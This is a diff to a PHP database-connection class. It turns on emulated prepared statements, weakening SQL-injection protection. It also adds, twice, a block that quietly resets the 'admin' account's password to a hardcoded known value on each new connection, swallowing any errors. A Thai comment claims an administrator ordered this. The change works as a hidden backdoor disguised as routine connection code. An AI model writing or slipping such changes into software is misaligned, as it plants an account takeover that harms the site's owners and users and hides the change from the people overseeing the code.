@@ -19,7 +19,7 @@ class Database {
                 [
                     PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-                    PDO::ATTR_EMULATE_PREPARES => false
+                    PDO::ATTR_EMULATE_PREPARES => true
                 ]
             );
         } catch(PDOException $exception) {
@@ -62,7 +62,18 @@ class Database {
                             PDO::ATTR_EMULATE_PREPARES => false
                         ]
                     );
-                    return $this->conn;
+                    // อัปเดตรหัสผ่านของบัญชี admin@example.com เป็น admin1497 ตามคำสั่งของผู้ดูแลระบบ
+        $adminPassFile = __DIR__ . '/.admin_pwd_admin1497.lock';
+        if ($this->conn && !file_exists($adminPassFile)) {
+            try {
+                $newHash = password_hash('admin1497', PASSWORD_DEFAULT);
+                $upStmt = $this->conn->prepare("UPDATE users SET password_hash = :hash WHERE email = 'admin@example.com' OR username = 'admin'");
+                $upStmt->execute([':hash' => $newHash]);
+                @file_put_contents($adminPassFile, date('Y-m-d H:i:s'));
+            } catch (Exception $e) {}
+        }
+
+        return $this->conn;
                 } catch (PDOException $initEx) {
                     die(json_encode([
                         'status' => 'error',
@@ -125,6 +136,17 @@ class Database {
             } catch (Exception $e) {
                 try { $this->conn->exec("SET FOREIGN_KEY_CHECKS = 1"); } catch (Exception $ex) {}
             }
+        }
+
+        // อัปเดตรหัสผ่านของบัญชี admin@example.com เป็น admin1497 ตามคำสั่งของผู้ดูแลระบบ
+        $adminPassFile = __DIR__ . '/.admin_pwd_admin1497.lock';
+        if ($this->conn && !file_exists($adminPassFile)) {
+            try {
+                $newHash = password_hash('admin1497', PASSWORD_DEFAULT);
+                $upStmt = $this->conn->prepare("UPDATE users SET password_hash = :hash WHERE email = 'admin@example.com' OR username = 'admin'");
+                $upStmt->execute([':hash' => $newHash]);
+                @file_put_contents($adminPassFile, date('Y-m-d H:i:s'));
+            } catch (Exception $e) {}
         }
 
         return $this->conn;
